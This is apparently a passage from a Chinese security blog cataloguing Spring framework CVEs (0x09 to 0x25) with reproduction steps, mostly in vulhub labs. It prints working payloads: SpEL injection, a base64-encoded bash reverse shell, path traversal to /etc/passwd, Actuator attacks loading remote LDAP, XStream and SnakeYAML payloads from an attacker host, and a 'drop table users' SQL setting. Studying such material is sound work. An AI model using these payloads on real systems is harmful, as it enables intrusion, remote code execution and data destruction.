<h2 id="0x09-CVE-2016-6652-Spring-Data-JPA-SQL盲注"><a href="#0x09-CVE-2016-6652-Spring-Data-JPA-SQL盲注" class="headerlink" title="0x09 CVE-2016-6652 Spring Data JPA SQL盲注"></a>0x09 CVE-2016-6652 Spring Data JPA SQL盲注</h2><p>影响版本：Spring Data JPA 1.10.2、1.9.4</p>
<p><a href="https://www.seebug.org/vuldb/ssvid-92534" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-92534</a></p>
<h2 id="0x10-CVE-2017-4971-Spring-WebFlow-远程代码执行漏洞"><a href="#0x10-CVE-2017-4971-Spring-WebFlow-远程代码执行漏洞" class="headerlink" title="0x10 CVE-2017-4971 Spring WebFlow 远程代码执行漏洞"></a>0x10 CVE-2017-4971 Spring WebFlow 远程代码执行漏洞</h2><blockquote>
<p>影响版本：Spring Web Flow 2.4.0 to 2.4.4</p>
</blockquote>
<p>使用vulhub搭建环境后，在添加poc执行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;_(new+java.lang.ProcessBuilder(&quot;ping&quot;,&quot;xxx.ceye.io&quot;)).start()=vulhub</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/3.png" alt></p>
<p><img src="/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/4.png" alt></p>
<p>无害化payload检测，如果 response header 中出现 vulnerable 头，则有漏洞：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;_T(org.springframework.web.context.request.RequestContextHolder).getRequestAttributes().getResponse().addHeader(&quot;vulnerable&quot;,&quot;True&quot;).aaa=n1nty</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/5.png" alt></p>
<h2 id="0x11-CVE-2017-8045-Spring-Amqp中的远程代码执行"><a href="#0x11-CVE-2017-8045-Spring-Amqp中的远程代码执行" class="headerlink" title="0x11 CVE-2017-8045 Spring Amqp中的远程代码执行"></a>0x11 CVE-2017-8045 Spring Amqp中的远程代码执行</h2><blockquote>
<p>影响版本：1.7.4、1.6.11和1.5.7之前的Spring AMQP版本</p>
</blockquote>
<p><a href="https://xz.aliyun.com/t/36" target="_blank" rel="noopener">https://xz.aliyun.com/t/36</a></p>
<h2 id="0x12-CVE-2017-8046-Spring-Data-REST-PATCH请求远程执行代码"><a href="#0x12-CVE-2017-8046-Spring-Data-REST-PATCH请求远程执行代码" class="headerlink" title="0x12 CVE-2017-8046 Spring Data REST PATCH请求远程执行代码"></a>0x12 CVE-2017-8046 Spring Data REST PATCH请求远程执行代码</h2><blockquote>
<p>影响版本：Spring Data REST 2.5.12, 2.6.7, 3.0 RC3之前的版本、Spring Data release trains Kay-RC3之前的版本、Spring Boot 2.0.0M4之前的版本</p>
</blockquote>
<p><a href="https://www.cnblogs.com/co10rway/p/9380441.html" target="_blank" rel="noopener">https://www.cnblogs.com/co10rway/p/9380441.html</a></p>
<p>利用POC执行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123; &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(&apos;ping xxx.ceye.io&apos;))/lastname&quot;, &quot;value&quot;: &quot;vulhub&quot; &#125;]</span><br></pre></td></tr></table></figure>

<p>反弹shell，其中反弹shell命令需要借助编码来减少重定向出错的问题<a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">java.lang.Runtime.exec() Payload Workarounds</a>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123; &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(&apos;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94LngueC54Lzg4OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&apos;))/lastname&quot;, &quot;value&quot;: &quot;vulhub&quot; &#125;]</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/6.png" alt></p>
<p><img src="/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/7.png" alt></p>
<h2 id="0x13-CVE-2018-1258-Spring-Security未经授权的访问"><a href="#0x13-CVE-2018-1258-Spring-Security未经授权的访问" class="headerlink" title="0x13 CVE-2018-1258 Spring Security未经授权的访问"></a>0x13 CVE-2018-1258 Spring Security未经授权的访问</h2><blockquote>
<p>影响版本：Spring Framework 5.0.5.RELEASE和Spring Security（任何版本）</p>
</blockquote>
<p>暂无详细信息</p>
<h2 id="0x14-CVE-2018-1259-具有XMLBeam的Spring-DataXXE"><a href="#0x14-CVE-2018-1259-具有XMLBeam的Spring-DataXXE" class="headerlink" title="0x14 CVE-2018-1259 具有XMLBeam的Spring DataXXE"></a>0x14 CVE-2018-1259 具有XMLBeam的Spring DataXXE</h2><p>影响版本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">XMLBeam 1.4.14或更早版本结合使用的Spring Data Commons</span><br><span class="line">Spring Data Commons 1.13至1.13.11（Ingalls SR11）</span><br><span class="line">Spring Data REST 2.6至2.6.11（Ingalls SR11）</span><br><span class="line">Spring Data Commons 2.0至2.0.6（Kay SR6）</span><br><span class="line">Spring Data REST 3.0至3.0.6（Kay SR6）</span><br></pre></td></tr></table></figure>

<p><a href="http://www.polaris-lab.com/index.php/tag/CVE-2018-1259/" target="_blank" rel="noopener">http://www.polaris-lab.com/index.php/tag/CVE-2018-1259/</a></p>
<p><a href="https://xz.aliyun.com/t/2341" target="_blank" rel="noopener">https://xz.aliyun.com/t/2341</a></p>
<h2 id="0x15-CVE-2018-1270-Spring-Messaging远程代码执行漏洞"><a href="#0x15-CVE-2018-1270-Spring-Messaging远程代码执行漏洞" class="headerlink" title="0x15 CVE-2018-1270 Spring Messaging远程代码执行漏洞"></a>0x15 CVE-2018-1270 Spring Messaging远程代码执行漏洞</h2><blockquote>
<p>影响版本：Spring Framework 5.0 to 5.0.4。Spring Framework 4.3 to 4.3.14</p>
</blockquote>
<p>同样利用vulhub搭建环境，首先我们先拦截connect，查看通过的ws包，点击后会有这么一个请求</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ws://x.x.x.x:8080/gs-guide-websocket/845/beqcexeb/websocket</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/8.png" alt></p>
<p>从bp中看到来回四个包，其中的内容为如上所示，修改如下请求包</p>
<p><img src="/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/9.png" alt></p>
<p>在发送任意消息，即可触发</p>
<p><img src="/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/10.png" alt></p>
<p>或者尝试使用vulhub提供的脚本，但是此脚本并不具备通用性，需要修改使用<a href="https://github.com/vulhub/vulhub/blob/master/spring/CVE-2018-1270/exploit.py" target="_blank" rel="noopener">poc</a></p>
<h2 id="0x16-CVE-2018-1271-Spring-MVC-目录穿越漏洞"><a href="#0x16-CVE-2018-1271-Spring-MVC-目录穿越漏洞" class="headerlink" title="0x16 CVE-2018-1271 Spring MVC 目录穿越漏洞"></a>0x16 CVE-2018-1271 Spring MVC 目录穿越漏洞</h2><p>当Spring MVC的静态资源存放在Windows系统上时，攻击可以通过构造特殊URL导致目录遍历漏洞。</p>
<p>此漏洞触发条件较高：</p>
<ol>
<li>Server运行于Windows系统上</li>
<li>从文件系统提供的文件服务（比如使用file协议，但不是file open）</li>
<li>没有使用CVE-2018-1199漏洞的补丁</li>
<li>不使用Tomcat或者是WildFly做Server</li>
</ol>
<p>漏洞利用和复现:</p>
<p><a href="https://blog.knownsec.com/2018/08/spring-mvc-目录穿越漏洞cve-2018-1271分析/" target="_blank" rel="noopener">https://blog.knownsec.com/2018/08/spring-mvc-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9Ecve-2018-1271%E5%88%86%E6%9E%90/</a></p>
<h2 id="0x17-CVE-2018-1273-Spring-Expression-Language-SPEL表达式注入漏洞"><a href="#0x17-CVE-2018-1273-Spring-Expression-Language-SPEL表达式注入漏洞" class="headerlink" title="0x17 CVE-2018-1273 Spring Expression Language SPEL表达式注入漏洞"></a>0x17 CVE-2018-1273 Spring Expression Language SPEL表达式注入漏洞</h2><p>影响版本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Spring Data Commons 1.13 - 1.13.10 (Ingalls SR10)</span><br><span class="line">Spring Data REST 2.6 - 2.6.10 (Ingalls SR10)</span><br><span class="line">Spring Data Commons 2.0 to 2.0.5 (Kay SR5)</span><br><span class="line">Spring Data REST 3.0 - 3.0.5 (Kay SR5)</span><br></pre></td></tr></table></figure>

<p><a href="https://www.cnblogs.com/hac425/p/9656747.html" target="_blank" rel="noopener">https://www.cnblogs.com/hac425/p/9656747.html</a></p>
<p><img src="/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/11.png" alt></p>
<p>POC：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc.exe&quot;)]=xxxusername[T(java.lang.Runtime).getRuntime().exec(&quot;ping+xxx.ceye.io&quot;)]=test</span><br></pre></td></tr></table></figure>



<h2 id="0x18-CVE-2018-1260-Spring-Security-Oauth2-远程代码执行"><a href="#0x18-CVE-2018-1260-Spring-Security-Oauth2-远程代码执行" class="headerlink" title="0x18 CVE-2018-1260 Spring Security Oauth2 远程代码执行"></a>0x18 CVE-2018-1260 Spring Security Oauth2 远程代码执行</h2><p>影响版本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Spring Security OAuth 2.3 to 2.3.2</span><br><span class="line">Spring Security OAuth 2.2 to 2.2.1</span><br><span class="line">Spring Security OAuth 2.1 to 2.1.1</span><br><span class="line">Spring Security OAuth 2.0 to 2.0.14</span><br></pre></td></tr></table></figure>

<p><a href="https://www.seebug.org/vuldb/ssvid-97287" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-97287</a></p>
<p>此漏洞和CVE-2016-4977类似</p>
<p>POC：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/oauth/authorize?client_id=client&amp;response_type=code&amp;redirect_uri=http://www.baidu.com&amp;scope=%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22ping%20r9rub4.ceye.io%22%29%7D</span><br></pre></td></tr></table></figure>



<h2 id="0x19-CVE-2018-15758-spring-security-oauth2权限提升"><a href="#0x19-CVE-2018-15758-spring-security-oauth2权限提升" class="headerlink" title="0x19 CVE-2018-15758 spring-security-oauth2权限提升"></a>0x19 CVE-2018-15758 spring-security-oauth2权限提升</h2><p>影响版本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Spring Security OAuth 2.3至2.3.3</span><br><span class="line">Spring Security OAuth 2.2至2.2.2</span><br><span class="line">Spring Security OAuth 2.1至2.1.2</span><br><span class="line">Spring Security OAuth 2.0到2.0.15</span><br></pre></td></tr></table></figure>

<p>使用了EnableResourceServer并且用了<code>AuthorizationRequest</code>的话。那么攻击者可以重新发送一次用过的验证请求，或者进行相应参数修改，从而造成权限提升。</p>
<p>例如劫持code，并且篡改其中的scope到all的话：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/oauth/authorize?client_id=client&amp;response_type=code&amp;redirect_uri=http://127.0.0.1&amp;scope=openid</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/12.png" alt></p>
<p>即授权了读取权限的时候，修改为all就可以获得全部权限。</p>
<h2 id="0x20-CVE-2019-3799-Spring-Cloud-Config-Server-目录遍历"><a href="#0x20-CVE-2019-3799-Spring-Cloud-Config-Server-目录遍历" class="headerlink" title="0x20 CVE-2019-3799 Spring Cloud Config Server: 目录遍历"></a>0x20 CVE-2019-3799 Spring Cloud Config Server: 目录遍历</h2><blockquote>
<p>影响版本：Spring-Cloud-Config-Server &lt; 2.1.2, 2.0.4, 1.4.6</p>
</blockquote>
<p>下载受影响的版本构建：<a href="https://github.com/spring-cloud/spring-cloud-config" target="_blank" rel="noopener">https://github.com/spring-cloud/spring-cloud-config</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd spring-cloud-config-server                                                                   ../mvnw spring-boot:run</span><br></pre></td></tr></table></figure>

<p>构建成功后访问：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8888/test/pathtraversal/master/..%252f..%252f..%252f..%252f../etc/passwd</span><br></pre></td></tr></table></figure>

<p>其中路径代表：<code>/{name}/{profile}/{label}/</code>，如下中所显示的json。</p>
<p><img src="/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/13.png" alt></p>
<h2 id="0x21-CVE-2019-3778-Spring-Security-OAuth-开放重定向"><a href="#0x21-CVE-2019-3778-Spring-Security-OAuth-开放重定向" class="headerlink" title="0x21 CVE-2019-3778 Spring Security OAuth 开放重定向"></a>0x21 CVE-2019-3778 Spring Security OAuth 开放重定向</h2><p>影响版本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Spring Security OAuth 2.3 to 2.3.4</span><br><span class="line">Spring Security OAuth 2.2 to 2.2.3</span><br><span class="line">Spring Security OAuth 2.1 to 2.1.3</span><br><span class="line">Spring Security OAuth 2.0 to 2.0.16</span><br></pre></td></tr></table></figure>

<p><a href="https://medium.com/@riemannbernhardj/investigating-spring-security-oauth2-cve-2019-3778-and-cve-2019-11269-a-p-o-c-attack-44895f2a5e70" target="_blank" rel="noopener">https://medium.com/@riemannbernhardj/investigating-spring-security-oauth2-cve-2019-3778-and-cve-2019-11269-a-p-o-c-attack-44895f2a5e70</a></p>
<p>用户登录后，CLIENT APP执行的以下请求包含REDIRECT_URI参数。 只需添加一个百分号即可触发重定向，而不是通过RedirectMismatchException错误来绕过验证。</p>
<p>例如原始请求如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/auth/oauth/authorize?response_type=code&amp;client_id=R2dpxQ3vPrtfgF72&amp;scope=user_info&amp;state=HPRbfRgJLWdmLMi9KXeLJDesMLfPC3vZ0viEkeIvGuQ%3D&amp;redirect_uri=http://localhost:8086/login</span><br></pre></td></tr></table></figure>

<p>只需要修改为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/auth/oauth/authorize?response_type=code&amp;client_id=R2dpxQ3vPrtfgF72&amp;scope=user_info&amp;state=HPRbfRgJLWdmLMi9KXeLJDesMLfPC3vZ0viEkeIvGuQ%3D&amp;redirect_uri=http://%localhost:8086/login</span><br></pre></td></tr></table></figure>

<p>这样就不会产生原本的认证错误，而且直接跳转到地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Location: http://localhost:8086/login</span><br></pre></td></tr></table></figure>



<h2 id="0x22-CNVD-2019-11630-Spring-Boot-Actuator命令执行漏洞"><a href="#0x22-CNVD-2019-11630-Spring-Boot-Actuator命令执行漏洞" class="headerlink" title="0x22 CNVD-2019-11630 Spring Boot Actuator命令执行漏洞"></a>0x22 CNVD-2019-11630 Spring Boot Actuator命令执行漏洞</h2><p><a href="https://www.veracode.com/blog/research/exploiting-spring-boot-actuators#" target="_blank" rel="noopener">https://www.veracode.com/blog/research/exploiting-spring-boot-actuators#</a></p>
<p>这个漏洞并不像是单一的问题产生，更像是一个渗透入侵的过程。有很多值得在意的知识点</p>
<ul>
<li>Spring Boot 1-1.4，无需身份验证即可访问以下敏感路径，而在2.x中，存在于/actuator路径下。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/dump-显示线程转储（包括堆栈跟踪）</span><br><span class="line">/trace-显示最后几条HTTP消息（其中可能包含会话标识符）</span><br><span class="line">/logfile-输出日志文件的内容</span><br><span class="line">/shutdown-关闭应用程序</span><br><span class="line">/mappings-显示所有MVC控制器映射</span><br><span class="line">/env-提供对配置环境的访问</span><br><span class="line">/restart-重新启动应用程序</span><br></pre></td></tr></table></figure>

<ul>
<li>jolokia进行远程代码执行，Jolokia允许通过HTTP访问所有已注册的MBean，并且旨在执行与JMX相同的操作。可以使用URL列出所有可用的MBeans操作：<a href="http://127.0.0.1:8090/jolokia/list" target="_blank" rel="noopener">http://127.0.0.1:8090/jolokia/list</a></li>
</ul>
<p>Logback库提供的<strong>reloadByURL</strong>操作使我们可以从外部URL重新加载日志配置，地址如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/artsploit.com!/</span><br><span class="line"></span><br><span class="line">logback.xmllogback.xml：</span><br><span class="line">&lt;configuration&gt;  </span><br><span class="line">	&lt;insertFromJNDI env-entry-name=&quot;ldap://artsploit.com:1389/jndi&quot; as=&quot;appName&quot; /&gt;&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>

<p>reloadByURL功能从<a href="http://artsploit.com/logback.xml下载新配置，并将其解析为Logback配置。这就导致两个问题：XXE盲攻击、恶意LDAP服务器解析引用导致RCE。" target="_blank" rel="noopener">http://artsploit.com/logback.xml下载新配置，并将其解析为Logback配置。这就导致两个问题：XXE盲攻击、恶意LDAP服务器解析引用导致RCE。</a></p>
<ul>
<li>通过/env来修改配置</li>
</ul>
<p>如果Spring Cloud Libraries在类路径中，则<strong>‘/ env’</strong>端点允许您修改Spring环境属性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /env HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8090</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length:65</span><br><span class="line"></span><br><span class="line">eureka.client.serviceUrl.defaultZone=http://artsploit.com/n/xstream</span><br></pre></td></tr></table></figure>

<p>此属性将Eureka serviceURL修改为任意值。Eureka Server通常用作发现服务器，目标类路径中具有Eureka-Client &lt;1.8.7，则可以利用其中的<strong>XStream反序列化漏洞</strong>。</p>
<p>其中xstream的内容类似如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;linked-hash-set&gt;</span><br><span class="line">  &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">    &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span><br><span class="line">      &lt;dataHandler&gt;</span><br><span class="line">        &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span><br><span class="line">          &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</span><br><span class="line">            &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</span><br><span class="line">              &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                  &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</span><br><span class="line">                  &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">                    &lt;command&gt;</span><br><span class="line">                      &lt;string&gt;/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt;</span><br><span class="line">                    &lt;/command&gt;</span><br><span class="line">                    &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span><br><span class="line">                  &lt;/next&gt;</span><br><span class="line">                &lt;/iter&gt;</span><br><span class="line">                &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span><br><span class="line">                  &lt;method&gt;</span><br><span class="line">                    &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span><br><span class="line">                    &lt;name&gt;start&lt;/name&gt;</span><br><span class="line">                    &lt;parameter-types/&gt;</span><br><span class="line">                  &lt;/method&gt;</span><br><span class="line">                  &lt;name&gt;foo&lt;/name&gt;</span><br><span class="line">                &lt;/filter&gt;</span><br><span class="line">                &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</span><br><span class="line">              &lt;/serviceIterator&gt;</span><br><span class="line">              &lt;lock/&gt;</span><br><span class="line">            &lt;/cipher&gt;</span><br><span class="line">            &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</span><br><span class="line">            &lt;ibuffer&gt;&lt;/ibuffer&gt;</span><br><span class="line">          &lt;/is&gt;</span><br><span class="line">        &lt;/dataSource&gt;</span><br><span class="line">      &lt;/dataHandler&gt;</span><br><span class="line">    &lt;/value&gt;</span><br><span class="line">  &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">&lt;/linked-hash-set&gt;</span><br></pre></td></tr></table></figure>

<p>然后调用’/ refresh’端点。</p>
<ul>
<li>有一种通过Spring环境属性修改来实现RCE的更可靠方法：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /env HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8090</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 59</span><br><span class="line">spring.cloud.bootstrap.location=http://artsploit.com/yaml-payload.yml</span><br></pre></td></tr></table></figure>

<p>该请求修改了“ spring.cloud.bootstrap.location”属性，该属性用于加载外部配置并以YAML格式解析它。为了做到这一点，我们还需要调用“/refresh”端点。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /refresh HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8090</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure>

<p>从远程服务器获取YAML配置时，将使用SnakeYAML库进行解析，该库也容易受到反序列化攻击。有效载荷（yaml-payload.yml）可以通过使用前述的Marshalsec研究生成：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">!!javax.script.ScriptEngineManager [</span><br><span class="line">  !!java.net.URLClassLoader [[</span><br><span class="line">    !!java.net.URL [&quot;http://artsploit.com/yaml-payload.jar&quot;]</span><br><span class="line">  ]]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>该jar文件的反序列化将触发提供的URLClassLoader的ScriptEngineManager构造函数的执行。jar文件可以在如下地址找到：<a href="https://github.com/artsploit/yaml-payload" target="_blank" rel="noopener">https://github.com/artsploit/yaml-payload</a></p>
<ul>
<li>/env配置</li>
</ul>
<p>除了关于执行RCE的地方，还有一些设置也很有用。</p>
<p><strong>spring.datasource.tomcat.validationQuery = drop + table + users-</strong>允许您指定任何SQL查询，它将针对当前数据库自动执行。它可以是任何语句，包括插入，更新或删除。</p>
<p><strong>spring.datasource.tomcat.url</strong> = jdbc:hsqldb:<a href="https://localhost:3002/xdb允许您修改当前的JDBC连接字符串。" target="_blank" rel="noopener">https://localhost:3002/xdb允许您修改当前的JDBC连接字符串。</a></p>
<p>这种设置只在1.x中，在Spring Boot 2.x中，改为了json格式。</p>
<h2 id="0x23-CVE-2019-11269-Spring-Security-OAuth-开放重定向"><a href="#0x23-CVE-2019-11269-Spring-Security-OAuth-开放重定向" class="headerlink" title="0x23 CVE-2019-11269 Spring Security OAuth 开放重定向"></a>0x23 CVE-2019-11269 Spring Security OAuth 开放重定向</h2><p>此漏洞为CVE-2019-3778的延伸版本，效果一致</p>
<p>影响版本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Spring Security OAuth 2.3至2.3.5</span><br><span class="line">Spring Security OAuth 2.2至2.2.4</span><br><span class="line">Spring Security OAuth 2.1至2.1.4</span><br><span class="line">Spring Security OAUth 2.0至2.0.17</span><br></pre></td></tr></table></figure>



<h2 id="0x24-CVE-2020-5398-Spring-Framework-RFD漏洞"><a href="#0x24-CVE-2020-5398-Spring-Framework-RFD漏洞" class="headerlink" title="0x24 CVE-2020-5398 Spring Framework RFD漏洞"></a>0x24 CVE-2020-5398 Spring Framework RFD漏洞</h2><blockquote>
<p>影响版本： Spring Framework, versions 5.2.0 to 5.2.3, 5.1.0 to 5.1.13, 5.0.0 to 5.0.16</p>
</blockquote>
<p>触发此漏洞的要求可以控制<code>content-disposition</code>文件名和扩展名来下载文件。触发的类型有些类似钓鱼文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=”https://&lt;trusted-server&gt;.com/api/users/&lt;attacker_id&gt;.cmd&quot; download&gt;</span><br><span class="line">Click me, Im a dolphin</span><br><span class="line">&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p>先准备一个受控制的配置文件等，上传到受信的服务器中，虽然对服务器不造成影响。但是可以在其中注入一些payload。</p>
<p>由于下载的文件名是受前端控制，发送filename的时候可以自己构造文件名下载。</p>
<p>spring对不能识别的文件下载的时候按照json格式来处理，但是url仍然可以使用。</p>
<p>当受害者点击如上的地址时，会下载一个<attacker_id>.cmd执行文件。原来spring对这种问题的处理是添加后缀为txt来改变文件的可执行效果。</attacker_id></p>
<p>但是这个设置可以绕过，采用如下形式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename：secure_install.cmd&quot;;</span><br></pre></td></tr></table></figure>

<p>会在表头中闭合造成如下效果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: attachment; filename=&quot;secure_install.cmd&quot;;.txt&quot;</span><br></pre></td></tr></table></figure>

<p>从而达到绕过限制来下载预先设定好的可执行文件等。</p>
<h2 id="0x25-CVE-2020-5405-Spring-Cloud-Config路径穿越导致的信息泄露"><a href="#0x25-CVE-2020-5405-Spring-Cloud-Config路径穿越导致的信息泄露" class="headerlink" title="0x25 CVE-2020-5405 Spring Cloud Config路径穿越导致的信息泄露"></a>0x25 CVE-2020-5405 Spring Cloud Config路径穿越导致的信息泄露</h2><blockquote>
<p>影响版本：spring-cloud-config-server &lt; 2.2.2</p>
</blockquote>
